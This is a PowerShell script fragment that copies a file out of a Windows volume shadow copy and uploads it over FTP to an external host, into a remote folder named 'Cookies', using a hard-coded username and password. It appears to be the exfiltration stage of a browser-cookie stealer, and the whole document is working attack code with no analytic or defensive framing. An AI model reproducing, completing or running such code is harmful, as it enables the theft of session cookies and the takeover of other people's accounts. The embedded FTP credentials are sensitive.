# Include necessary assemblies for FTP
Add-Type -AssemblyName System.Net

# FTP server details
$FTP_HOST = "us-east-1.sftpcloud.io"
$FTP_USERNAME = "d45b8e2d698147e59f2234fd87b98082"
$FTP_PASSWORD = 'CHbEN9bcriLn1f8X5pBzc66ZZsgrIa3p'

# Function to upload files to the FTP server
function Upload-ToFtp {
    param (
        [String]$FilePath,
        [String]$FileName
    )
    $FtpUrl = "ftp://$FTP_HOST/Cookies/$FileName"
    $FtpRequest = [System.Net.FtpWebRequest]::Create($FtpUrl)
    $FtpRequest.Credentials = New-Object System.Net.NetworkCredential($FTP_USERNAME, $FTP_PASSWORD)
    $FtpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
    $FtpRequest.UseBinary = $true
    $FtpRequest.KeepAlive = $false
    $Content = [System.IO.File]::ReadAllBytes($FilePath)
    $FtpRequest.ContentLength = $Content.Length
    $RequestStream = $FtpRequest.GetRequestStream()
    $RequestStream.Write($Content, 0, $Content.Length)
    $RequestStream.Close()
    Write-Host "Uploaded $FileName to FTP in /Cookies."
}

# Main script continues...
# Assuming previous steps for creating shadow copy and identifying file to copy

if ($shadowCopyPath) {
    $sourceFilePath = Join-Path -Path $sourceDirectory -ChildPath $fileName
    $targetFilePath = Join-Path -Path $targetDirectory -ChildPath $fileName

    # Attempt to copy the file from the shadow copy to the target path
    try {
        Copy-FileFromShadow -ShadowCopyPath $shadowCopyPath -SourceFilePath $sourceFilePath -TargetFilePath $targetFilePath
        Write-Host "File copied successfully from shadow copy to $targetFilePath"

        # Proceed to upload the file to FTP
        Upload-ToFtp -FilePath $targetFilePath -FileName $fileName
    }
    catch {
        Write-Error "Failed to copy file from shadow copy: $_"
    }
    finally {
        # Clean up the shadow copy to free up resources
        Remove-ShadowCopy -ShadowCopyId $shadowCopyPath
    }
} else {
    Write-Host "Could not create shadow copy."
}
